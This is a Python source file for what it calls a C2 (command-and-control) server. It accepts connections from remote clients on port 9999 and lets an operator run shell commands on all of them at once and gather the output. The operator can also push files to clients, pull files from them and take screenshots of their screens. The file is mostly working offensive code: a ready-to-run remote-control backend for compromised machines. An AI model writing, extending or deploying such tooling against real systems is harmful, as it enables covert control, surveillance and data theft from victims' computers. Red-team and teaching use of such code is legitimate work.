"""
This module is the main module for C2 server.
"""
import mimetypes
import os
from argparse import ArgumentParser
from concurrent.futures.thread import ThreadPoolExecutor
from datetime import datetime
from logging import Formatter, DEBUG, StreamHandler, getLogger
from select import select
from shlex import split, quote
from socket import socket, MSG_PEEK
from threading import Thread

import magic
import pandas
import rich
from rich.table import Table

import utils
from utils import C2Socket, Commands

THREADED = True
FILENAME_LOG = open("server.log", "w")
DOWNLOAD_DIRECTORY = "./download"
N_WORKERS = os.cpu_count()
DEFAULT_INTERFACE = '0.0.0.0'
DEFAULT_PORT = 9999
CLIENTS = dict()  # type: dict[tuple[str,int],Client]

logger = getLogger('server')
logger.setLevel(DEBUG)

handler = StreamHandler(FILENAME_LOG)
handler.setLevel(DEBUG)
handler.setFormatter(
    Formatter('%(asctime)s %(name)s:%(levelname)s - %(filename)s:%(funcName)s:L%(lineno)d - %(message)s', '%H:%M:%S'))
logger.addHandler(handler)

utils_handler = StreamHandler(FILENAME_LOG)
utils_handler.setLevel(DEBUG)
utils_handler.setFormatter(utils.formatter)

utils.logger.addHandler(utils_handler)


class Client(C2Socket):
    """ Extended class of C2Socket representing a single C2 client """

    def send_command(self, command: str, args=''):
        """ Send command to client """
        full_command = (command + ' ' + args).encode()
        self.send_packet(full_command)


class CommandLauncher:
    """ Class used to parse, and start commands entered in terminal """

    def __init__(self, u_input):
        self.command_id = datetime.now().strftime("%Y-%m-%d-%H-%M-%S")
        self.input = u_input
        self.cmd = None
        self.cmd_args = None
        self.shared = list()
        self._path = f'{DOWNLOAD_DIRECTORY}/{self.command_id}'
        self.is_path_created = False

    def is_valid(self):
        """ Check if input is valid

        Returns (bool): True if it is valid, else False
        """
        try:
            self.cmd, *self.cmd_args = split(self.input)
            return True
        except ValueError as err:
            print(err)
            logger.debug("command %s invalid : %s", self.input, err)
        return False

    @property
    def path(self):
        """ Returns download path for this specific command """
        if not self.is_path_created:
            os.makedirs(self._path, exist_ok=True)
            self.is_path_created = True
        return self._path

    def teardown(self):
        """ Execute teardown actions associated with command

        To set a teardown action for a command, just create method "teardown_commandname".
        This function will be called after the clients communication.

        """
        name = 'teardown_%s' % self.cmd
        if hasattr(self, name):
            logger.debug("Starting teardown : %s", name)
            getattr(self, name)()
        else:
            logger.debug("No teardown named : %s", name)

    def start(self):
        """ Execute command

        This includes :
            - Cleaning clients list
            - Executing each command asynchronously on all clients
            - Executing teardown function

        """
        clients_cleaner()
        commands = [ServerCommands(self, client) for client in CLIENTS.values()]

        if sum([1 if c.is_valid() else 0 for c in commands]) != len(commands):
            print("There is some errors")
            return

        if THREADED:
            with ThreadPoolExecutor(N_WORKERS) as ex:
                list(ex.map(lambda x: x.execute(), commands))
        else:
            for command in commands:
                command.execute()

        self.teardown()

    def teardown_sh(self):
        """ Save all stdin/stderr of clients to CSV """
        pandas.DataFrame \
            .from_records(self.shared, columns=['host', 'output']) \
            .sort_values(by="host") \
            .to_csv(f'{self.path}/output.csv')


class ServerCommands(Commands):
    """ Extending Commands class to add server commands
    """

    def __init__(self, launcher: CommandLauncher, sock: Client):
        super().__init__(sock, launcher.cmd, launcher.cmd_args, launcher.input)
        self.sock = sock
        self.launcher = launcher

    @staticmethod
    def help():
        """ Print help for implemented commands """
        table = Table(show_header=True, header_style="bold blue", show_lines=True)
        table.add_column("Command")
        table.add_column("Description")
        for name, fct in filter(lambda i: i[0].startswith('command_') and type(i[1]).__name__ == 'function',
                                ServerCommands.__dict__.items()):
            table.add_row(name, fct.__doc__)
        rich.print(table)

    def command_upload(self, local_fn: str, dist_fn: str):
        """ Upload local file on remote client

        Args:
            local_fn (str): Local filename
            dist_fn (str): Filename on clients
        """
        self.sock.send_command('upload', quote(dist_fn))
        with open(local_fn, 'rb') as file:
            self.sock.send_file(file)

    def command_download(self, filename: str):
        """ Download client file

        Args:
            filename (str): Download file from remote client to local
        """
        self.sock.send_command('download', quote(filename))
        filename = f"{self.launcher.path}/download_{self.sock.ip_address}_{self.sock.port}"
        with open(filename, 'wb') as file:
            self.sock.read_into_file(file)
        try:
            ext = mimetypes.guess_extension(magic.Magic(mime=True).from_file(filename))
            if ext:
                os.rename(filename, filename + ext)
        except OSError as err:
            print("Cannot guess mime type : ", err)

    def command_screenshot(self):
        """ Take a screenshot of client """
        self.sock.send_command("screenshot")

        filename = f'screenshot_{self.sock.ip_address}_{self.sock.port}.png'
        with open(f'{self.launcher.path}/{filename}', 'wb') as file:
            self.sock.read_into_file(file)

    def command_list(self):
        """ Print client """
        print(f"{self.sock.ip_address}:{self.sock.port}")

    def command_sh(self, *cmd):
        """ Execute shell command on client and receive output
        Args:
            *cmd: need for inspect
        """
        self.sock.send_command("sh", self.input)
        out = self.sock.read_packet().strip()
        try:
            out = out.decode()
            print("%s:%s >" % (self.sock.ip_address, self.sock.port), out.split('\n', maxsplit=2)[0])
        except ValueError:
            pass
        self.launcher.shared.append(("%s:%s" % (self.sock.ip_address, self.sock.port), out))


def clients_cleaner():
    """ Remove disconnected clients from global dictionnary.

    Using non-blocking select on clients sockets, we find all ready-to-read clients.
    Then, we try to read bytes from socket (using MSG_PEEK then not removing data from recv queue).
    If empty, it means the client is disconnected.

    TODO: manage blocking recv

    """
    index = {cli.sock: cli for cli in CLIENTS.values()}  # type: dict[socket, Client]
    read_ready, *_ = select(index.keys(), [], [], 0)
    for sock_cli in read_ready:  # type: socket
        try:
            if not sock_cli.recv(32, MSG_PEEK):
                raise Exception()
        except:
            remote_cli = index.get(sock_cli).ip_address, index.get(sock_cli).port
            logger.debug("Client %s:%s disconnected", remote_cli)
            CLIENTS.pop(remote_cli)


class ServerThread(Thread):
    """ Representing server main thread. """

    def __init__(self, address):
        super().__init__(name='ServerThread', daemon=True)

        self.socket = socket()
        self.socket.bind(address)
        self.socket.listen(10)

    def run(self):
        print("Server listen on interface %s port %s" % self.socket.getsockname())
        while True:
            client_sock, client_addr = self.socket.accept()
            print(f'Client {client_addr} connected\n')
            logger.debug(f'Client {client_addr} connected\n')

            CLIENTS[client_addr] = Client(*client_addr, client_sock)

    def __enter__(self):
        return self

    def __exit__(self, *args, **kwargs):
        logger.debug("Server exit")
        for s in CLIENTS.values():
            s.__exit__()
        self.socket.__exit__()


if __name__ == '__main__':
    PARSER = ArgumentParser()
    PARSER.add_argument('-i', '--interface', default=DEFAULT_INTERFACE, help='Listening interface')
    PARSER.add_argument('-p', '--port', type=int, default=DEFAULT_PORT, help='Listening port')
    ARGS = PARSER.parse_args()

    try:
        with ServerThread((ARGS.interface, ARGS.port)) as server:
            server.start()
            while True:
                USER_INPUT = input(">> ").strip()
                if USER_INPUT:
                    if USER_INPUT in ["quit", "exit", "bye"]:
                        break
                    if USER_INPUT in ["clear"]:
                        os.system('clear')
                    elif USER_INPUT in ["help", "h"]:
                        ServerCommands.help()
                    else:
                        if USER_INPUT.startswith('!'):
                            USER_INPUT = 'sh ' + USER_INPUT[1:]
                        CL = CommandLauncher(USER_INPUT)
                        if not CL.is_valid():
                            print("Bad syntax")
                        CL.start()
    except KeyboardInterrupt:
        pass
